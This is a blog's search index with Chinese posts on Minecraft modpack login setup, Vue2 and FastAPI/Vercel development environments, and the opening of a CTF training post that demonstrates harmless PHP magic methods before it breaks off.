<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【Minecraft】通过第三方登录游玩懒人包</title>
      <link href="/posts/5996/"/>
      <url>/posts/5996/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文适用于IntoTheDark整合的我的世界懒人包，分别从解压、第三方皮肤站、第三方登录、Java环境配置四个步骤面向新手玩家进行教程。</p><h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><p>懒人包一般包含本体和启动器，内置加载资源，无需下载，解压即可获取全部资源。一级压缩目录通常如图所示：</p><p><img src="/posts/5996/image-20240826181248883.png" alt="image-20240826181248883"></p><p>将懒人包压缩包寻找一个合适的地方<u>智能解压</u>，打开解压后的目录即可看到上图文件夹</p><h2 id="第三方皮肤站注册【已在此站注册请忽略】"><a href="#第三方皮肤站注册【已在此站注册请忽略】" class="headerlink" title="第三方皮肤站注册【已在此站注册请忽略】"></a>第三方皮肤站注册【已在此站注册请忽略】</h2><p>接下来打开浏览器，通常使用微软浏览器Microsoft Edge，界面如图所示：</p><img src="/posts/5996/image-20240826181746714.png" alt="image-20240826181746714" style="zoom:50%;"><p>在上图红框内输入第三方皮肤站地址或点击下述地址：<a href="http://47.94.154.251:20015/">http://47.94.154.251:20015/</a> ，进入本文提供的第三方皮肤站。界面如图：</p><img src="/posts/5996/image-20240826181934594.png" alt="image-20240826181934594" style="zoom:50%;"><img src="/posts/5996/image-20240826182016656.png" alt="image-20240826182016656" style="zoom:50%;"><img src="/posts/5996/image-20240826182025409.png" alt="image-20240826182025409" style="zoom:50%;"><p>其中<u>游戏内角色名</u>为在我的世界中你想取的任意英文昵称，<u>邀请码</u>请联系懒人包内指定人员进行获取。注册成功后返回登录即可。</p><h2 id="第三方登录账户"><a href="#第三方登录账户" class="headerlink" title="第三方登录账户"></a>第三方登录账户</h2><p>登录成功之后界面会自动跳转至皮肤站首页，界面如下图所示：</p><img src="/posts/5996/image-20240826182442590.png" alt="image-20240826182442590" style="zoom:50%;"><p>接下来打开<u>Plain Craft Launcher 2</u>（以后简称PCL）启动器，将上图中皮肤站的按钮拖动至启动器中：</p><img src="/posts/5996/image-20240826182918441.png" alt="image-20240826182918441" style="zoom: 55%;"><h2 id="Java环境配置"><a href="#Java环境配置" class="headerlink" title="Java环境配置"></a>Java环境配置</h2><p>登陆完成之后需要将压缩包内的JAVA添加至启动器中：</p><p><img src="/posts/5996/image-20240826202115000.png" alt="image-20240826202115000"></p><p>之后启动游戏即可。</p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>在跟着本文配置完成后，之后的启动都无需再次进行配置，启动启动器即可畅快游玩，祝你玩得开心，联机愉快！</p>]]></content>
      
      
      <categories>
          
          <category> game </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【2023】XJUSEC春季培训-内存取证</title>
      <link href="/posts/43467/"/>
      <url>/posts/43467/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>内存取证在近年来长期占据Misc方向的中高难度地位，通常结合磁盘取证、文件隐写等方面综合考察选手的取证技术。为便于后续进行回顾学习，特在此对内存取证进行学习记录。</p></blockquote><h2 id="题目形式"><a href="#题目形式" class="headerlink" title="题目形式"></a>题目形式</h2><p>题目通常以磁盘文件为形式</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XJUSEC开发经验分享（三）——安卓开发环境</title>
      <link href="/posts/25011/"/>
      <url>/posts/25011/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XJUSEC开发经验分享（二）--vue开发环境</title>
      <link href="/posts/15554/"/>
      <url>/posts/15554/</url>
      
        <content type="html"><![CDATA[<h1 id="VUE2开发环境"><a href="#VUE2开发环境" class="headerlink" title="VUE2开发环境"></a>VUE2开发环境</h1><blockquote><p>vue是node.js中易学易用，性能出色，适用场景丰富的 Web 前端框架，拥有比较成熟的社区和第三方库。以下以vue2为例，介绍vue框架的开发环境配置，项目建立，基本编译运行等。</p></blockquote><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p>vue开发需要的环境有以下：</p><ul><li>【IDE】webstorm</li><li>【开发语言】Node.js</li><li>【部署脚手架】vue-cli</li></ul><h3 id="Node-js安装"><a href="#Node-js安装" class="headerlink" title="Node.js安装"></a>Node.js安装</h3><p>首先打开<a href="https://nodejs.org/zh-cn">官网</a>下载安装包，一般为了稳定性会选择长期维护版：</p><p><img src="/posts/15554/image-20230413104037699.png" alt="image-20230413104037699"></p><p>除了以下需要选择安装位置的地方需要修改安装位置，其余直接无脑next</p><p><img src="/posts/15554/image-20230413104813400.png" alt="image-20230413104813400"></p><p> 之后直接<code>node -v</code>查看node.js版本</p><p><img src="/posts/15554/image-20230413104910063.png" alt="image-20230413104910063"></p><h2 id="版本控制（可选）"><a href="#版本控制（可选）" class="headerlink" title="版本控制（可选）"></a>版本控制（可选）</h2><p>因项目需要或者已经停更的第三方库需要，有时需要对node.js做版本控制，可以下载nvm来进行版本的控制，借用此工具可以通过命令行来进行node.js版本的切换。</p><p>首先从官方github下载最新的<a href="https://github.com/coreybutler/nvm-windows">nvm-windows</a>（下载速度慢的话可以科学上网），以下教程以本文编写日期最新版本为例。</p><p><img src="/posts/15554/image-20230421153520481.png" alt="image-20230421153520481"></p><p>注意在安装时在选择快捷方式链接的时候记得在你想要添加到环境变量的文件夹下创建一个目录，之后在安装时选取该目录。</p><p><img src="/posts/15554/image-20230421153740940.png" alt="image-20230421153740940"></p><p>之后<code>nvm list</code>查看nvm控制的node.js版本</p><p><img src="/posts/15554/image-20230421153836468.png" alt="image-20230421153836468"></p><h2 id="下载换源"><a href="#下载换源" class="headerlink" title="下载换源"></a>下载换源</h2><p>npm是Node.js的包管理器，用于安装和管理Node.js模块。默认情况下，npm使用官方源（registry.npmjs.org）来下载和安装模块，但是由于网络原因或其他问题，有时候从官方源安装模块会很慢或失败。</p><p>因此，为了提高安装速度和稳定性，有时候需要将npm的源更换为国内的镜像源。常用的国内镜像源包括淘宝npm镜像（registry.npm.taobao.org）、cnpmjs镜像（r.cnpmjs.org）等。</p><p>以下是几种常用的npm换源方式：</p><p>​1.临时使用：在使用npm命令时，可以使用–registry选项指定临时的镜像源。例如，要使用淘宝镜像安装模块，可以执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install &lt;package-name&gt; --registry=https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>​2.永久修改：可以通过npm config命令来永久修改镜像源。例如，要将镜像源设置为淘宝镜像，可以执行以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>​3.使用nrm工具：nrm是一个npm镜像源管理工具，可以方便地切换不同的镜像源。可以使用npm全局安装nrm，然后使用nrm ls命令查看可用的镜像源，使用nrm use <registry-name>命令切换镜像源。例如，要切换到淘宝镜像，可以执行以下命令：</registry-name></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm</span><br><span class="line">nrm ls</span><br><span class="line">nrm use taobao</span><br></pre></td></tr></table></figure><h2 id="通过脚手架生成vue2项目"><a href="#通过脚手架生成vue2项目" class="headerlink" title="通过脚手架生成vue2项目"></a>通过脚手架生成vue2项目</h2><p><strong>安装vue-cli脚手架</strong></p><p>全局安装，输入命令行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vue-cli -g  </span><br></pre></td></tr></table></figure><p>安装完成之后，输入命令行vue -V查看版本号，出现相应得到版本号即为成功。</p><p>以webpack为模板初始化vue项目，等待下载后再对应选项填入信息。可以以下图选项为参考设置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue init webpack &lt;projiect-name&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/15554/image-20230421155917601.png" alt="image-20230421155917601"></p><p>之后根据项目生成成功提示，依次输入以下命令，打开<a href="http://localhost:8080即可看到项目界面：">http://localhost:8080即可看到项目界面：</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入到项目目录下</span></span><br><span class="line">cd test_project</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">以开发模式启动vue项目服务器</span></span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p><img src="/posts/15554/image-20230421160240549.png" alt="image-20230421160240549"></p>]]></content>
      
      
      <categories>
          
          <category> development </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【Vercel】通过Vercel部署fastapi服务</title>
      <link href="/posts/35463/"/>
      <url>/posts/35463/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通常为了允许用户最终访问Web应用程序，我们会把代码部署到云服务器或云托管平台上。虽然有许多工具可以实现这一点，但在本文中，我们将介绍如何将 FastAPI 应用程序部署到 Vercel。</p><p>FastAPI 是一个现代且快速的 Python Web 框架，用于构建后端 API 应用程序。FastAPI 支持由 Swagger、安全模块和类型检查提供支持的 API 文档，以确保代码的正确性。</p><h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><ul><li>python相关知识</li><li>了解git的基本使用</li><li>在Vercel官网注册账户</li></ul><h2 id="构建一个简单的fastapi程序"><a href="#构建一个简单的fastapi程序" class="headerlink" title="构建一个简单的fastapi程序"></a>构建一个简单的fastapi程序</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI</span><br><span class="line"><span class="keyword">from</span> routers <span class="keyword">import</span> account</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line">app.include_router(account.router)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">uvicorn.run(<span class="string">&quot;app:app&quot;</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>, reload=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># routers/account.py</span></span><br><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> APIRouter</span><br><span class="line"></span><br><span class="line">router = APIRouter()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@router.get(<span class="params"><span class="string">&#x27;/login&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">get_user</span>(<span class="params">user_id: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="comment"># 处理获取用户信息的请求</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;ID&quot;</span>:user_id&#125;</span><br></pre></td></tr></table></figure><p>运行文件：<code>app.py</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> python3 app.py</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">INFO:     Uvicorn running on http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">8080</span> (Press CTRL+C to quit)</span><br><span class="line">INFO:     Started reloader <span class="keyword">process</span> [<span class="number">15452</span>] <span class="keyword">using</span> StatReload</span><br><span class="line">INFO:     Started server <span class="keyword">process</span> [<span class="number">20232</span>]</span><br><span class="line">INFO:     Waiting <span class="keyword">for</span> application startup.</span><br><span class="line">INFO:     Application startup complete.</span><br></pre></td></tr></table></figure><p>可以在浏览器上查看该应用程序。我们将使用浏览器来测试我们的应用程序端点。<code>http://0.0.0.0:8080/login?user_id=IntoTheDark</code></p><p>得到如下结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;ID&quot;:&quot;IntoTheDark&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="将-FastAPI-应用程序部署到-Vercel"><a href="#将-FastAPI-应用程序部署到-Vercel" class="headerlink" title="将 FastAPI 应用程序部署到 Vercel"></a>将 FastAPI 应用程序部署到 Vercel</h2><p>在本文中，我们将Web程序部署到 Vercel，如果没有安装 Vercel 命令行工具，可以通过运行以下命令来获取它：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i vercel <span class="literal">-g</span></span><br></pre></td></tr></table></figure><p>接下来，登录vercel：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vercel login</span><br></pre></td></tr></table></figure><p>要部署到 Vercel，需要一个配置文件，在父目录中创建<code>vercel.json</code>并添加以下Json数据：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;builds&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/app.py&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;use&quot;</span><span class="punctuation">:</span> <span class="string">&quot;@vercel/python&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/(.*)&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;app.py&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在继续部署之前，让我们创建一个包含应用程序依赖项的文件：<code>requirements.txt</code>，该文件通过pipreqs库生成，安装方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pipreqs</span><br></pre></td></tr></table></figure><p>pipreqs 指定项目目录， 将项目所依赖组件写入“requirements.txt” 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipreqs ./ --encoding=utf8</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//requirements.txt</span><br><span class="line">fastapi==0.95.0</span><br><span class="line">uvicorn==0.21.1</span><br></pre></td></tr></table></figure><p>配置和需求文件就绪后，让我们初始化 Vercel，在根目录中运行以下命令： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vc .</span><br></pre></td></tr></table></figure><p><img src="/posts/35463/image-20230410204848774.png" alt="image-20230410204848774"></p><h2 id="登录Vercel网站校验"><a href="#登录Vercel网站校验" class="headerlink" title="登录Vercel网站校验"></a>登录Vercel网站校验</h2><p><img src="/posts/35463/image-20230410205137744.png" alt="image-20230410205137744"></p><p><img src="/posts/35463/image-20230410205156919.png" alt="image-20230410205156919"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【2023】XJUSEC春节培训-pop链构造</title>
      <link href="/posts/33565/"/>
      <url>/posts/33565/</url>
      
        <content type="html"><![CDATA[<h2 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h2><blockquote><p>1.__construct()，类的构造函数<br>2.__destruct()，类的析构函数<br>3.__call()，在对象中调用一个不可访问方法时调用<br>4.__get()，获得一个类的成员变量时调用<br>5.__set()，设置一个类的成员变量时调用<br>6.__isset()，当对不可访问属性调用isset()或empty()时调用<br>7.__unset()，当对不可访问属性调用unset()时被调用。<br>8.__sleep()，执行serialize()时，先会调用这个函数<br>9.__wakeup()，执行unserialize()时，先会调用这个函数<br>10.__toString()，类被当成字符串时的回应方法<br>11.__invoke()，调用函数的方式调用一个对象时的回应方法<br>12.__clone()，当对象复制完成时调用</p></blockquote><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$a</span>-&gt;name);</span><br></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;该对象被销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ &quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$a</span>-&gt;name);</span><br></pre></td></tr></table></figure><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>,<span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;该方法不存在：&quot;</span>.<span class="variable">$funName</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><p>类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误。那么为了解决这个问题，我们可以使用魔术方法 __get()。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Permission&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$a</span>-&gt;name);</span><br></pre></td></tr></table></figure><h3 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$property</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$property</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="string">&quot;ZQJ&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="string">&quot;aaa&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>());</span><br></pre></td></tr></table></figure><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$id</span>,<span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;id = <span class="variable">$id</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">BaseClass</span>(<span class="number">1</span>,<span class="string">&quot;ZQJ&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>-&gt;id));</span><br><span class="line"><span class="keyword">echo</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>-&gt;name));</span><br></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$sex</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseClass2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$sex</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sex = <span class="variable">$sex</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 